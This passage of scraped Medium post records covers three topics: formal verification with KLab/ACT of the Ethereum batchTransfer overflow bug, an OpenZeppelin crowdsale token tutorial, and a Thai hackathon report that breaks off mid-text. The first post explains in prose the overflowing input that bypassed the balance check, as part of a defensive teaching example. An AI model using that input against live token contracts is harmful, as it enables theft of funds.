post, we will try to use KLab to show how a classic hack - Batch overflow could be prevented. We will also explore ACT in more details as well as reach some of its limitations.Reminder:ACT is a fairly simple language provided by KLAB that helps in generating high-level semantics in K. The whole ecosystem is described in part1; some basics on ACT were already described in part2.A tragedy that could be avoidedIn the history of Ethereum, there were a few big hacks caused by implementation issues in smart contracts. One of the famous was the one with batch overflow. We want to show that this problem could be avoided if formal verification had been used.The code of the considerate contract is here. The problem is in the following function:The vulnerability is caused by code in line 3, where SafeMath should have been used:The attack for the original code is the following: you can pick a huge _value such that for example (2 * _value) overflows the range of uint256, e.g. _value = MAX_INT/2+1This will casue amount to equal 2 and will bypasschecks in line 5, while amount added to receiver in line 9 will be much bigger than amount of all tokens in circulation.Could this bug be noticed earlier? Let\u2019s write high-level intended semantics for the batchTransfer function and check if it is consistent with the actual code.Note: We have to change the interface of the batchTransfer function since at this particular moment dynamic arrays are not yet supported by KLab. So, we will alter solidity code:The announced above high-level semantics for the batchTransfer function is as follows:As an exercise, you can try to check that the above implementation of batchTransfer function fails the proof of consistency with the semantics, however after fixing the bug in line 5 \u2014 it passes.The fixed code is here:Watch out: the proof for the above on my MacBook Air took ~3 hours!ConclusionThis example shows how formal verification could prevent the hack. It also shows the limitations of practical verification with ACT.ACT cheatsheetAs we reached the first limitations of ACT it seems like a good moment to see what is the list of all available headers.In part2 of this series we described the general structure of a specification written in ACT, in particular, three headers: IF, IFF (particularly to express assumptions) and STORAGE. More headers below:SUCH THATThis is used solely to express constraints for statements (S). Let us see an example (special thanks to MrChico from dapphub for this example; all following examples are from official dapphub materials):As you can see the above specifies that a function change behaves in such a way that it modifies two particular positions at the storage (0 and 1 stands for the first two variables of the code of the function) with the constraint that the final values must sum up to the input value x.GASYou can specify accurate usage of your gas:STACKYou can specify direct changes to stack:CALLSYou can specify that an external function is called.RETURNSYou can specify what is returned by your function:BALANCEYou should be able to specify that a balance of a specific address is somehow changed. However, this is not yet available in KLab.Act vs KKLab gives a great promise for a solid, reliable tool for formal verification. However, it is a tool on an early stage and there are significant limitations: lack of support for account balance or arrays are two examples. To be able to efficiently obtain a proof of correctness, one has to write Solidity code in a specific manner:All functions should be short and do just one specific thing. If you have a complicated multi-purpose function in your contract, we recommend splitting into a few smaller specialized functions.Calls to unknown code should be avoided.The code should be as simple and straightforward as possible.KLab is an upper layer of a stack of technologies (Details: part1). Directly underneath KLab, there is a language K, in which we can also state our high-level semantics.K is a more expressive language but comes with its own trade-offs:K\u2019s prover outputs just TRUE or FALSE, while KLab\u2019s prover is equipped with a graphical debugger that helps to find a counterexample for a failed proof. (We will cover debugger in a future blog post)Second, to write directly in K, one has to understand accurately EVM (more specifically: KEVM, which description of EVM written in K) which isn\u2019t a piece of cake.So that reality of today\u2019s formal verification of EVM code is that one should understand both ACT and K to be efficient.And so: next time, we will give you a smooth introduction to K!", "responses": 2, "tags": ["Ethereum", "Formal Verification", "Solidity", "Evm", "Act"]}, {"title": "How To Build A Simple Capped Crowdsale Token Using OpenZeppelin Library \u2014 Part 1", "post_link": "https://medium.com/crowdbotics/how-to-build-a-simple-capped-crowdsale-token-using-openzeppelin-library-part-1-2789ec642308?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2018-10-22", "last_modified_date": "2019-06-12", "readtime": "4.90", "claps": 90, "voters": 11, "content": "How To Build A Simple Capped Crowdsale Token Using OpenZeppelin Library \u2014 Part 1Using Open-Zeppelin Library to build a basic capped ERC20 token sale.Gaurav AgrawalFollowOct 22, 2018 \u00b7 5 min readToday, we are going to build a capped crowdsale with a mintable token using open-zeppelin library. (If you are a complete beginner, you should check out the previous tutorial on how to set up a solidity project and how to test a contract.) Open-zeppelin library provides basic building blocks to build an ERC20 Token on ethereum and will abstract away a lot of details for building an ERC20 token to get us up and running quicker.PrerequisiteBasic solidity conceptsUnderstanding of ERC20 token standard and implementationThings we will cover in the article:DefinitionsOpen ZeppelinBuilding a crowdsaleDefinitionsERC20 TokenERC20 is an ethereum standard for building a token. It defines a set of functions which a smart contract has to implement in order be ERC20 compliant. These standards are important to ethereum ecosystem and also helps you to make your contract robust, predictable and bug-free.CrowdsaleA crowdsale is selling tokens to meet the financial requirements of the projects. Project share equity as a form of the token to contributors. In crypto world, crowd sales are called ICOs (Initial coin offering).Capped CrowdsaleA project can have different types of constraints, one of them is capping. A capped crowdsale sets a limit on the total funding accepted and the number of tokens that will be distributed by the project. For example, we can cap on total ether contribution or if you want to put a cap on an investor for minimum contribution (let\u2019s say 2 ether) and maximum contribution (let\u2019s say 50 ether).Benefits of a capped ICOA capped ICO helps investors to estimate value per token. It puts out the distribution structure and contributors get to know how many tokens are getting hold by the team and what are the plans to spend raised funds. It can also create a scarcity, thus increasing the value per token.Minimum and maximum contribution cap help to get more people to participate in the token distribution, you don\u2019t want that all the token get bought by 100 people.Mintable TokenIn Mintable token, smart contract mint(create) tokens on the time of contribution. In this, you don\u2019t permit tokens, so total supply gets decided based on total contributed ethers. Our contract will handle this logic too.Building A Capped Crowdsale Token Using Open-Zeppelin LibraryOpen ZeppelinWe will use open zeppelin library to build our smart contract. Open zeppelin library provides basic building blocks to build an ERC20 Token on ethereum. It is a well-tested library and many projects use it on their production so it\u2019s safe too.Building a capped crowdsale contractSo let\u2019s build a smart Capped ERC20 token. We will call our Token Example token. Below is code for ExampleToken and ExampleTokenCrowdsale.ExampleToken.sol \u2014 Code for our Example tokenExampleTokenCrowdsale.sol \u2014 code for our crowdsale ContractWe are using open-zeppelin library which will abstract away a lot of details for building an ERC20 token and crowdsale contract. Feel free to ask questions on the comment section, if you don\u2019t get something.Installing OpenZeppelin SolidityWe need to install openZeppelin library using NPM.npm install openzeppelin-solidityLet\u2019s go through our contracts on by one.Our ERC20 Token \u2014 ExampleToken.solIn this contract, we are defining ERC20 Token. One important thing to understand that open-zeppelin modularize many things, so don\u2019t get overwhelmed with the so many file imports. If you come from the object-oriented background, then just see them as contracts inheriting interfaces and other contracts for their properties.image sourceLet\u2019s look at our imports, we are importing 3 contracts from the open-zeppelin library, we will go through them one by one. You can find all these files inside node_modules under given path.import \"openzeppelin-solidity/contracts/token/ERC20/DetailedERC20.sol\";import \"openzeppelin-solidity/contracts/token/ERC20/StandardToken.sol\";import \"openzeppelin-solidity/contracts/token/ERC20/MintableToken.sol\";DetailedERC20.solThis contract itself importing ERC20.sol which is simply the ERC20 interface. This will be used for initializing our token. As you can see, you need to set Token name, symbol and how many decimal point it will use. For example, ethereum uses 18 decimal point, where the smallest unit is wei (1 ether= \u00b9\u2070\u00b9\u2078 wei).pragma solidity ^0.4.24;import \"./ERC20.sol\";contract DetailedERC20 is ERC20 {  string public name;  string public symbol;  uint8 public decimals;constructor(string _name, string _symbol, uint8 _decimals) public {    name = _name;    symbol = _symbol;    decimals = _decimals;  }}You can go on and check ERC20.sol which is importing ERC20Basic.sol and these two files combined have standard functions of an ERC20 token.StandardToken.solThis contract is a standard and well-tested implementation of ERC20 token methods. For the sake of simplicity, I am not adding contract code, you can check contract under the same path.MintableToken.solThis contract has our token minting logic. So let\u2019s look at this contract closely. It\u2019s importing ownable and StandardToken.Ownable contract helps in putting access controls and managing ownership. It defines modifiers using which functions can be made owner accessible and It helps you to manage contract ownership.Now, let\u2019s look at out mint() function, It receives two parameters one is beneficiary account and another is a total number of tokens to be added. notice mint() function, it\u2019s increasing total supply and balances variable is available through inheriting StandardTokencontract, which maintain the balance of every contributor.This function will be called from MintedCrowdsale contract (we will see that in the next part of this tutorial).pragma solidity ^0.4.24;import \"./StandardToken.sol\";import \"../../ownership/Ownable.sol\";contract MintableToken is StandardToken, Ownable {  event Mint(address indexed to, uint256 amount);  event MintFinished();bool public mintingFinished = false;modifier canMint() {    require(!mintingFinished);    _;  }modifier hasMintPermission() {    require(msg.sender == owner);    _;  }function mint(    address _to,    uint256 _amount  )    public    hasMintPermission    canMint    returns (bool)  {    totalSupply_ = totalSupply_.add(_amount);    balances[_to] = balances[_to].add(_amount);    emit Mint(_to, _amount);    emit Transfer(address(0), _to, _amount);    return true;  }function finishMinting() public onlyOwner canMint returns (bool) {    mintingFinished = true;    emit MintFinished();    return true;  }}ConclusionIn this part, we have created a Capped ERC20 token using open-zeppelin library. We have talked about different basic contracts provided by open-zeppelin library and how can we use them to build a capped ERC20 token.In the next part, we will cover our ExampleTokenCrowdsale contract and will see how we can use different open-zeppelin library contracts to build our crowdsale smart contract.On To Part 2 \u2192Notes & SuggestionsThere are a lot of things which handled by open-zeppelin library and almost every basic functionality is provided by the library. If you don\u2019t understand something, please comment.If you have any problem while following through this tutorial, Check out my github code.Starting a new blockchain project, or looking for a Solidity developer?Crowdbotics helps business build cool things with Solidity (among other things). If you have a blockchain project where you need additional developer resources, drop us a line. Crowbotics can help you estimate build time for given product and feature specs, and provide specialized Solidity developers as you need them. If you\u2019re building with Solidity, check out Crowdbotics.", "responses": 3, "tags": ["Ethereum", "Tutorial", "Openzeppelin", "Crowdsale", "Solidity"]}, {"title": "SET - Blockchain Hackathon", "post_link": "https://piyawut.com/set-blockchain-hackathon-a17936680c98?source=search_post", "author_name": "Piyawut Thongsang ( \u0e1b\u0e34\u0e22\u0e30\u0e27\u0e38\u0e12\u0e34 \u0e17\u0e2d\u0e07\u0e41\u0e2a\u0e07 )", "author_link": "https://piyawut.com/@wutmaster", "publish_date": "2016-12-03", "last_modified_date": "2018-05-21", "readtime": "2.80", "claps": 12, "voters": 12, "content": "SET - Blockchain HackathonPiyawut Thongsang ( \u0e1b\u0e34\u0e22\u0e30\u0e27\u0e38\u0e12\u0e34 \u0e17\u0e2d\u0e07\u0e41\u0e2a\u0e07 )FollowDec 3, 2016 \u00b7 3 min read\u0e20\u0e32\u0e04\u0e41\u0e0a\u0e23\u0e4c\u0e1b\u0e23\u0e30\u0e2a\u0e1a\u0e01\u0e32\u0e23\u0e13\u0e4c\u0e1c\u0e21\u0e21\u0e35\u0e42\u0e2d\u0e01\u0e32\u0e2a\u0e40\u0e02\u0e49\u0e32\u0e23\u0e48\u0e27\u0e21 Blockchain Hackathon \u0e08\u0e31\u0e14\u0e42\u0e14\u0e22 SET (\u0e15\u0e36\u0e01\u0e43\u0e2b\u0e21\u0e48 \u0e15\u0e23\u0e07 \u0e16.\u0e23\u0e31\u0e0a\u0e14\u0e32\u0e2f) \u0e23\u0e48\u0e27\u0e21\u0e01\u0e31\u0e1a \u0e1a\u0e23\u0e34\u0e29\u0e31\u0e17 Odd-e Thailand \u0e19\u0e33\u0e42\u0e14\u0e22\u0e17\u0e35\u0e21\u0e04\u0e38\u0e13\u0e23\u0e39\u0e1f Twin Panichsombat. Consultant \u0e0a\u0e37\u0e48\u0e2d\u0e14\u0e31\u0e07 (idol \u0e1c\u0e21\u0e40\u0e25\u0e22\u0e2d\u0e48\u0e30) \u0e01\u0e34\u0e08\u0e01\u0e23\u0e23\u0e21\u0e14\u0e31\u0e07\u0e01\u0e25\u0e48\u0e32\u0e27\u0e08\u0e31\u0e14\u0e40\u0e1b\u0e47\u0e19\u0e04\u0e23\u0e31\u0e49\u0e07\u0e17\u0e35\u0e48 2 \u0e43\u0e19\u0e44\u0e17\u0e22 \u0e2b\u0e25\u0e31\u0e07\u0e08\u0e32\u0e01\u0e17\u0e35\u0e48\u0e01\u0e32\u0e23\u0e08\u0e31\u0e14\u0e04\u0e23\u0e31\u0e49\u0e07\u0e41\u0e23\u0e01 \u0e40\u0e1b\u0e47\u0e19\u0e01\u0e32\u0e23\u0e23\u0e27\u0e21\u0e01\u0e25\u0e38\u0e48\u0e21\u0e02\u0e2d\u0e07\u0e1c\u0e39\u0e49\u0e2a\u0e19\u0e43\u0e08 Blockchain \u0e0b\u0e36\u0e48\u0e07\u0e19\u0e33\u0e42\u0e14\u0e22 \u201cSPRINT3r\u201d \u0e40\u0e2a\u0e35\u0e22\u0e14\u0e32\u0e22\u0e17\u0e35\u0e48\u0e1c\u0e21\u0e1e\u0e25\u0e32\u0e14\u0e04\u0e23\u0e31\u0e49\u0e07\u0e41\u0e23\u0e01\u0e44\u0e1b \u0e04\u0e23\u0e31\u0e49\u0e07\u0e19\u0e35\u0e49\u0e08\u0e36\u0e07\u0e08\u0e30\u0e1e\u0e25\u0e32\u0e14\u0e2d\u0e35\u0e01\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e41\u0e25\u0e49\u0e27 \u0e41\u0e15\u0e48\u0e01\u0e47\u0e16\u0e37\u0e2d\u0e27\u0e48\u0e32\u0e42\u0e0a\u0e04\u0e14\u0e35\u0e21\u0e32\u0e01\u0e46 \u0e17\u0e35\u0e48\u0e44\u0e14\u0e49\u0e1a\u0e31\u0e15\u0e23\u0e43\u0e19\u0e23\u0e2d\u0e1a\u0e40\u0e01\u0e37\u0e2d\u0e1a\u0e17\u0e49\u0e32\u0e22\u0e46 \u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e08\u0e32\u0e01\u0e23\u0e31\u0e1a\u0e40\u0e1e\u0e35\u0e22\u0e07 60 \u0e04\u0e19 \u0e40\u0e25\u0e22\u0e2d\u0e22\u0e32\u0e01\u0e21\u0e32\u0e40\u0e25\u0e48\u0e32\u0e1b\u0e23\u0e30\u0e2a\u0e1a\u0e01\u0e32\u0e23\u0e13\u0e4c\u0e2a\u0e19\u0e38\u0e01\u0e46 \u0e02\u0e2d\u0e07\u0e07\u0e32\u0e19\u0e19\u0e35\u0e49 \u0e01\u0e31\u0e19\u0e04\u0e23\u0e31\u0e1a\u0e23\u0e39\u0e1b\u0e41\u0e1a\u0e1a\u0e02\u0e2d\u0e07\u0e07\u0e32\u0e19\u201cHackathon\u201d (Hack+Marahon) \u0e40\u0e1b\u0e47\u0e19\u0e01\u0e32\u0e23\u0e08\u0e31\u0e14\u0e07\u0e32\u0e19\u0e17\u0e35\u0e48\u0e23\u0e27\u0e1a\u0e23\u0e27\u0e21\u0e1c\u0e39\u0e49\u0e21\u0e35\u0e17\u0e35\u0e48\u0e21\u0e35\u0e04\u0e27\u0e32\u0e21\u0e04\u0e25\u0e31\u0e48\u0e07\u0e43\u0e04\u0e25\u0e49\u0e43\u0e19\u0e14\u0e49\u0e32\u0e19\u0e44\u0e2d\u0e17\u0e35 \u0e42\u0e14\u0e22\u0e40\u0e09\u0e1e\u0e32\u0e30\u0e14\u0e49\u0e32\u0e19 Programming ,Hacking \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e23\u0e32\u0e08\u0e30\u0e40\u0e23\u0e35\u0e22\u0e01\u0e1a\u0e38\u0e04\u0e04\u0e25\u0e40\u0e2b\u0e25\u0e48\u0e32\u0e19\u0e35\u0e49\u0e27\u0e48\u0e32 \u0e1e\u0e27\u0e01 Geek \u0e01\u0e47\u0e44\u0e14\u0e49 \u0e42\u0e14\u0e22\u0e23\u0e39\u0e1b\u0e41\u0e1a\u0e1a\u0e01\u0e32\u0e23\u0e08\u0e31\u0e14\u0e07\u0e32\u0e19\u0e14\u0e31\u0e07\u0e01\u0e25\u0e48\u0e32\u0e27 \u0e17\u0e32\u0e07\u0e1c\u0e39\u0e49\u0e08\u0e31\u0e14\u0e07\u0e32\u0e19\u0e08\u0e30\u0e21\u0e35\u0e42\u0e08\u0e17\u0e22\u0e4c\u0e43\u0e2b\u0e49\u0e2b\u0e23\u0e37\u0e2d\u0e43\u0e2b\u0e49\u0e17\u0e32\u0e07\u0e1c\u0e39\u0e49\u0e40\u0e02\u0e49\u0e32\u0e23\u0e48\u0e27\u0e21\u0e07\u0e32\u0e19\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e04\u0e34\u0e14\u0e42\u0e08\u0e17\u0e22\u0e4c\u0e44\u0e14\u0e49\u0e40\u0e2d\u0e07 \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e19\u0e33\u0e21\u0e32\u0e43\u0e0a\u0e49\u0e43\u0e19\u0e01\u0e32\u0e23\u0e41\u0e02\u0e48\u0e07\u0e02\u0e31\u0e19\u0e41\u0e25\u0e30\u0e41\u0e01\u0e49\u0e42\u0e08\u0e17\u0e22\u0e4c\u0e23\u0e48\u0e27\u0e21\u0e01\u0e31\u0e19\u0e43\u0e19\u0e40\u0e27\u0e25\u0e32\u0e17\u0e35\u0e48\u0e08\u0e33\u0e01\u0e31\u0e14 (\u0e2d\u0e32\u0e08\u0e08\u0e30\u0e43\u0e0a\u0e49\u0e40\u0e27\u0e25\u0e32\u0e1b\u0e23\u0e30\u0e21\u0e32\u0e13 1\u20132 \u0e27\u0e31\u0e19 \u0e2b\u0e23\u0e37\u0e2d\u0e2d\u0e32\u0e08\u0e15\u0e48\u0e2d\u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e19\u0e32\u0e19\u0e40\u0e1b\u0e47\u0e19\u0e2d\u0e32\u0e17\u0e34\u0e15\u0e22\u0e4c) \u0e42\u0e14\u0e22\u0e23\u0e2d\u0e1a\u0e19\u0e35\u0e49\u0e07\u0e32\u0e19\u0e08\u0e31\u0e14 2 \u0e27\u0e31\u0e19 \u0e40\u0e23\u0e34\u0e48\u0e21\u0e08\u0e32\u0e01\u0e27\u0e31\u0e19\u0e40\u0e2a\u0e32\u0e23\u0e4c 26 \u0e1e.\u0e22. 09.00 \u0e19. \u0e16\u0e36\u0e07 \u0e2d\u0e32\u0e17\u0e34\u0e15\u0e22\u0e4c 27 \u0e1e.\u0e22. 2559 17.00 \u0e19. \u0e19\u0e31\u0e1a\u0e40\u0e1b\u0e47\u0e19\u0e23\u0e30\u0e22\u0e30\u0e40\u0e27\u0e25\u0e32 32 \u0e0a\u0e31\u0e48\u0e27\u0e42\u0e21\u0e07\u0e15\u0e48\u0e2d\u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e43\u0e0a\u0e49\u0e40\u0e27\u0e25\u0e32\u0e43\u0e19\u0e01\u0e32\u0e23 coding (\u0e02\u0e49\u0e32\u0e21\u0e04\u0e37\u0e19\u0e01\u0e31\u0e19\u0e40\u0e25\u0e22\u0e17\u0e35\u0e40\u0e14\u0e35\u0e22\u0e27)Agenda \u0e40\u0e2a\u0e32\u0e23\u0e4c 26 \u0e1e.\u0e22. 25598:00\u20139:00 \u0e25\u0e07\u0e17\u0e30\u0e40\u0e1a\u0e35\u0e22\u0e199:00\u20139:30 \u0e40\u0e1b\u0e34\u0e14\u0e07\u0e32\u0e199:30\u201311:30 an introduction to Blockchain and Smart Contract by Smart Contract Thailand11:30\u201312:00 regrouping12:00\u201313:00 lunch13:00 -17:00 1st sprint: product discovery and gather idea17:00\u201318:00 dinner18:00\u201324:00 2nd sprint\u0e2d\u0e32\u0e17\u0e34\u0e15\u0e22\u0e4c 27 \u0e1e.\u0e22. 255924:00\u201306:00 3rd sprint06:00\u201312:00 4th sprint12:00\u201313:00 lunch13:00\u201316:00 Sharing result16:00\u201317:00 \u0e1b\u0e34\u0e14\u0e07\u0e32\u0e19\u0e40\u0e23\u0e34\u0e48\u0e21 Hackathon  09.00\u201311.30 \u0e04\u0e38\u0e13 Bank \u0e08\u0e32\u0e01 Smart Contract Thailand \u0e21\u0e32\u0e43\u0e2b\u0e49\u0e04\u0e27\u0e32\u0e21\u0e23\u0e39\u0e49\u0e40\u0e23\u0e37\u0e48\u0e2d\u0e07 introduction to Blockchain \u0e23\u0e27\u0e21\u0e16\u0e36\u0e07 \u0e01\u0e32\u0e23\u0e40\u0e02\u0e49\u0e32\u0e21\u0e32\u0e21\u0e35\u0e1a\u0e17\u0e1a\u0e32\u0e17 \u0e02\u0e2d\u0e07 Blockchain \u0e43\u0e19\u0e20\u0e32\u0e04\u0e18\u0e38\u0e23\u0e01\u0e34\u0e08\u0e15\u0e48\u0e32\u0e07\u0e46 \u0e23\u0e31\u0e1a\u0e0a\u0e21 Fackbook Live VDO \u0e44\u0e14\u0e49\u0e08\u0e32\u0e01 \u0e17\u0e35\u0e48\u0e19\u0e35\u0e4811.30\u201312.00 \u0e04\u0e38\u0e13\u0e1e\u0e38\u0e18\u0e41\u0e25\u0e30\u0e04\u0e38\u0e13\u0e04\u0e23\u0e34\u0e2a\u0e21\u0e32\u0e2a \u0e08\u0e32\u0e01 Enter corp \u0e21\u0e32\u0e43\u0e2b\u0e49\u0e04\u0e27\u0e32\u0e21\u0e23\u0e39\u0e49\u0e14\u0e49\u0e32\u0e19\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 Blockchain \u0e1a\u0e19 Ethereum Platform (\u0e1a\u0e19\u0e20\u0e32\u0e29\u0e32 Solidity)\u0e40\u0e23\u0e35\u0e22\u0e19\u0e23\u0e39\u0e49\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19\u0e42\u0e1b\u0e23\u0e41\u0e01\u0e23\u0e21 \u0e44\u0e14\u0e49\u0e08\u0e32\u0e01 \u0e17\u0e35\u0e48\u0e19\u0e35\u0e48 12.00\u201313.00 \u0e1e\u0e31\u0e01\u0e23\u0e31\u0e1a\u0e1b\u0e23\u0e30\u0e17\u0e32\u0e19\u0e2d\u0e32\u0e2b\u0e32\u0e23\u0e40\u0e17\u0e35\u0e48\u0e22\u0e07 \u0e19\u0e49\u0e33 \u0e02\u0e19\u0e21 \u0e08\u0e32\u0e01\u0e1c\u0e39\u0e49\u0e2a\u0e19\u0e31\u0e1a\u0e2a\u0e19\u0e38\u0e19 \u0e01\u0e23\u0e38\u0e07\u0e28\u0e23\u0e35 Innovation \u0e41\u0e25\u0e30 IBM thailand13.00\u201314.30 \u0e40\u0e08\u0e49\u0e32\u0e2b\u0e19\u0e49\u0e32\u0e17\u0e35\u0e48\u0e08\u0e32\u0e01 SET (\u0e02\u0e2d\u0e2d\u0e20\u0e31\u0e22\u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e16\u0e32\u0e21\u0e0a\u0e37\u0e48\u0e2d) \u0e41\u0e15\u0e48\u0e1e\u0e35\u0e48\u0e40\u0e02\u0e32\u0e40\u0e01\u0e48\u0e07\u0e21\u0e32\u0e01\u0e04\u0e23\u0e31\u0e1a \u0e21\u0e32\u0e43\u0e2b\u0e49\u0e04\u0e27\u0e32\u0e21\u0e23\u0e39\u0e49\u0e14\u0e49\u0e32\u0e19\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19 Blockchain ,Chain-code \u0e1a\u0e19 Hyperledger Platform (\u0e1a\u0e19\u0e20\u0e32\u0e29\u0e32 Golang)\u0e40\u0e23\u0e35\u0e22\u0e19\u0e23\u0e39\u0e49\u0e01\u0e32\u0e23\u0e40\u0e02\u0e35\u0e22\u0e19\u0e42\u0e1b\u0e23\u0e41\u0e01\u0e23\u0e21 \u0e44\u0e14\u0e49\u0e08\u0e32\u0e01 \u0e17\u0e35\u0e48\u0e19\u0e35\u0e48\u0e1e\u0e2d\u0e40\u0e23\u0e32\u0e44\u0e14\u0e49 recap \u0e04\u0e27\u0e32\u0e21\u0e23\u0e39\u0e49 \u0e43\u0e19\u0e14\u0e49\u0e32\u0e19 Blockchain prgraming \u0e41\u0e25\u0e49\u0e27 \u0e40\u0e23\u0e32\u0e01\u0e47\u0e21\u0e32\u0e25\u0e38\u0e22\u0e17\u0e33\u0e42\u0e08\u0e17\u0e22\u0e4c\u0e01\u0e31\u0e19\u0e40\u0e25\u0e22\u0e04\u0e23\u0e31\u0e1a \u0e40\u0e08\u0e47\u0e1a\u0e08\u0e23\u0e34\u0e07 \u0e40\u0e2b\u0e19\u0e37\u0e48\u0e2d\u0e22\u0e08\u0e23\u0e34\u0e07 \u0e2a\u0e19\u0e38\u0e01\u0e08\u0e23\u0e34\u0e07 \u0e01\u0e47\u0e0a\u0e48\u0e27\u0e07\u0e19\u0e35\u0e49\u0e41\u0e2b\u0e25\u0e48\u0e30\u0e42\u0e14\u0e22\u0e40\u0e23\u0e32\u0e08\u0e30\u0e41\u0e22\u0e01\u0e40\u0e1b\u0e47\u0e19 10 \u0e01\u0e25\u0e38\u0e48\u0e21 \u0e41\u0e1a\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e01\u0e25\u0e38\u0e48\u0e21\u0e25\u0e30 5\u20138 \u0e04\u0e19\u0e25\u0e07\u0e21\u0e37\u0e2d\u0e40\u0e23\u0e32\u0e40\u0e23\u0e34\u0e48\u0e21\u0e17\u0e33\u0e42\u0e1b\u0e23\u0e41\u0e01\u0e23\u0e21\u0e1a\u0e19 Blockchain \u0e42\u0e14\u0e22\u0e01\u0e32\u0e23\u0e43\u0e2b\u0e49\u0e41\u0e15\u0e48\u0e25\u0e30\u0e17\u0e48\u0e32\u0e19 \u0e21\u0e32\u0e19\u0e33\u0e40\u0e2a\u0e19\u0e2d Project \u0e2b\u0e23\u0e37\u0e2d Business case \u0e17\u0e35\u0e48\u0e2d\u0e22\u0e32\u0e01\u0e19\u0e33 Blockchian \u0e21\u0e32\u0e41\u0e01\u0e49\u0e1b\u0e31\u0e0d\u0e2b\u0e32 \u0e16\u0e49\u0e32\u0e43\u0e04\u0e23\u0e2a\u0e19\u0e43\u0e08\u0e43\u0e19\u0e2b\u0e31\u0e27\u0e02\u0e49\u0e2d\u0e2d\u0e30\u0e44\u0e23 \u0e01\u0e47\u0e40\u0e14\u0e34\u0e19\u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e02\u0e2d\u0e23\u0e48\u0e27\u0e21\u0e01\u0e25\u0e38\u0e48\u0e21\u0e01\u0e31\u0e19\u0e44\u0e14\u0e49\u0e40\u0e25\u0e22 (\u0e40\u0e08\u0e4b\u0e07\u0e1b\u0e48\u0e30)\u0e1c\u0e21\u0e2d\u0e22\u0e39\u0e48\u0e43\u0e19\u0e01\u0e25\u0e38\u0e48\u0e21 Krungsri Innovation\u0e42\u0e14\u0e22 \u0e2b\u0e25\u0e31\u0e01\u0e46 \u0e21\u0e35\u0e01\u0e25\u0e38\u0e48\u0e21 Project \u0e14\u0e31\u0e07\u0e19\u0e35\u0e49\u0e01\u0e25\u0e38\u0e48\u0e21 \u0e0a\u0e32\u0e27\u0e19\u0e32\u0e44\u0e17\u0e22 \u0e40\u0e2a\u0e19\u0e2d\u0e08\u0e30\u0e19\u0e33 Blockchain \u0e21\u0e32\u0e0a\u0e48\u0e27\u0e22\u0e40\u0e1e\u0e34\u0e48\u0e21\u0e02\u0e35\u0e14\u0e04\u0e27\u0e32\u0e21\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e0a\u0e32\u0e27\u0e19\u0e32\u0e44\u0e17\u0e22 \u0e1c\u0e48\u0e32\u0e19 web application \u0e17\u0e31\u0e49\u0e07\u0e43\u0e19\u0e41\u0e07\u0e48 \u0e01\u0e32\u0e23\u0e27\u0e32\u0e07\u0e41\u0e1c\u0e19\u0e01\u0e32\u0e23\u0e1b\u0e25\u0e39\u0e01 \u0e04\u0e27\u0e32\u0e21\u0e23\u0e39\u0e49 \u0e01\u0e32\u0e23\u0e2b\u0e32\u0e1c\u0e39\u0e49\u0e1b\u0e25\u0e39\u0e01 \u0e1b\u0e38\u0e4b\u0e22 \u0e23\u0e27\u0e21\u0e16\u0e36\u0e07\u0e01\u0e32\u0e23\u0e02\u0e32\u0e22 (\u0e40\u0e23\u0e35\u0e22\u0e01\u0e44\u0e14\u0e49\u0e27\u0e48\u0e32\u0e2d\u0e22\u0e32\u0e01\u0e0a\u0e48\u0e27\u0e22\u0e0a\u0e32\u0e27\u0e19\u0e32\u0e44\u0e17\u0e22 \u0e43\u0e2b\u0e49\u0e21\u0e35\u0e23\u0e30\u0e1a\u0e1a IT \u0e1c\u0e48\u0e32\u0e19 Blockchain \u0e41\u0e1a\u0e1a\u0e04\u0e23\u0e1a\u0e27\u0e07\u0e08\u0e23\u0e01\u0e31\u0e19\u0e40\u0e25\u0e22\u0e17\u0e35\u0e40\u0e14\u0e35\u0e22\u0e27)\u0e01\u0e25\u0e38\u0e48\u0e21 Thai Smart Refer\u0e19\u0e33 Blockchain \u0e21\u0e32\u0e1e\u0e31\u0e12\u0e19\u0e32\u0e23\u0e30\u0e1a\u0e1a\u0e2a\u0e48\u0e07\u0e1c\u0e39\u0e49\u0e1b\u0e48\u0e27\u0e22\u0e44\u0e1b\u0e42\u0e23\u0e07\u0e1e\u0e22\u0e32\u0e1a\u0e32\u0e25\u0e15\u0e48\u0e32\u0e07\u0e46 \u0e43\u0e19\u0e1b\u0e23\u0e30\u0e40\u0e17\u0e28\u0e44\u0e17\u0e22 \u0e42\u0e14\u0e22\u0e43\u0e0a\u0e49\u0e2b\u0e25\u0e31\u0e01\u0e01\u0e32\u0e23\u0e02\u0e2d\u0e07 distributed ledger \u0e21\u0e32\u0e0a\u0e48\u0e27\u0e22\u0e23\u0e30\u0e1a\u0e1a Scale \u0e44\u0e14\u0e49\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e21\u0e2b\u0e32\u0e28\u0e32\u0e25 \u0e41\u0e25\u0e30\u0e21\u0e35\u0e2a\u0e40\u0e16\u0e35\u0e22\u0e23\u0e20\u0e32\u0e1e\u0e02\u0e36\u0e49\u0e19 \u0e08\u0e32\u0e01\u0e40\u0e14\u0e34\u0e21\u0e17\u0e35\u0e48\u0e23\u0e30\u0e1a\u0e1a\u0e21\u0e35\u0e1b\u0e31\u0e0d\u0e2b\u0e32 performance \u0e41\u0e25\u0e30\u0e40\u0e1b\u0e47\u0e19 centrallized\u0e01\u0e25\u0e38\u0e48\u0e21 Krungsri Innovation Project mini Trade Finance + Mobile Digital Identity\u0e1e\u0e31\u0e12\u0e19\u0e32 \u0e23\u0e30\u0e1a\u0e1a Trade Finance \u0e1c\u0e48\u0e32\u0e19 Blockchain 